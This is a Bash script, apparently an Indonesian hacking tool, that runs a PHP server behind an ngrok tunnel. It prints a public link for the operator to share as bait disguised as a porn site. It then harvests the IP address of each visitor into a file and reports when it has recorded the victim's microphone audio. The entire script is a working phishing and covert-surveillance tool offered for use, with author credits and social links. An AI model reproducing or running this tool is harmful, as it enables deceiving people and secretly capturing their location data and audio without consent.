#!/bin/bash
hedygans(){
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

}
hedy(){
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menuggu targets,\e[0m\e[1;77m tekan Ctrl + C untuk kaluar...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target open Bokep!\n"
hedygans
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Suara Desah telah direkam!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


ngrok(){
    printf ""
    printf "\e[1;92m[\e[0m+\e[1;92m]\033[1;38;5;208mStart php server su\033[31;1m(\033[37;1mHostpotnya Hidupin su!!\033[31;1m)\e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...!!!\e[0m\n"
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m]\033[1;38;5;208mStart ngrok server su\033[31;1m(\033[37;1mHotspot idupin\033[31;1m)\e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...!!!\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10
    redirect_link="https://www.instagram.com/wong_biasa0723/"
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    sed 's+forwarding_link+'$link'+g' template.php > index.php
    sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js

    printf "\e[1;92m[\e[0m+\e[1;92m] Share bokep\033[31;1m Nekopoi\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link


}
load(){

     echo -e "\n"
    bar=" TiKuS_PeReTaS-mIkRoFoN......!!!! "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r%-${barlength}s\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
    printf '\n'
}
pembuka(){
    printf "\033[33;1m press enter untuk lanjut..........!"
    read
    printf "\033[32;1m selamat datang, siapa nama kaka?"
    read nama
    printf "\033[32;1m--=[\033[33;1m+\033[32;1m]\033[37;1mSelamat Datang $nama Jones:V\033[32;1m[\033[33;1m+\033[32;1m]=--"
    printf '\n'
}


banner(){
printf "\033[34;1m                                           __  "
printf '\n'
printf "\033[32;1m      ╔╦╗┬┬┌─┬ ┬┌─┐\033[33;1m╔═╗┌─┐┬─┐┌─┐┌┬┐┌─┐┌─┐\033[34;1m  /__\   "     
printf '\n'
printf "\033[32;1m       ║ │├┴┐│ │└─┐\033[33;1m╠═╝├┤ ├┬┘├┤  │ ├─┤└─┐\033[34;1m  \__/"                    
printf '\n'
printf "\033[32;1m       ╩ ┴┴ ┴└─┘└─┘\033[33;1m╩  └─┘┴└─└─┘ ┴ ┴ ┴└─┘\033[34;1m   ||"
printf '\n'
printf "\033[34;1m                                           ||"
printf '\n'
printf "\033[34;1m                                            \__"                                                                                                       
                                                                                                                 
printf '\n'                                                                                                                 
sleep 3

printf "\033[31;1m                     .:| Author:\033[37;1mWhoMHw \033[31;1m|:. "
printf '\n'
printf "\033[34;1m                     .:| Telegram:\033[37;1mHedy2\033[34;1m|:.    "
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mYoutubme:https://www.youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA/featured"
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mGithub:https://github.com/WhoMHw"
printf '\n'
sleep 0.07
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mGithub:https://github.com/WongBiasa"
printf '\n'
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/wong_biasa0723/"
printf "\n"
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/siapa_namasaya23/"
printf '\n'
sleep 3
}


pembuka
load
banner
ngrok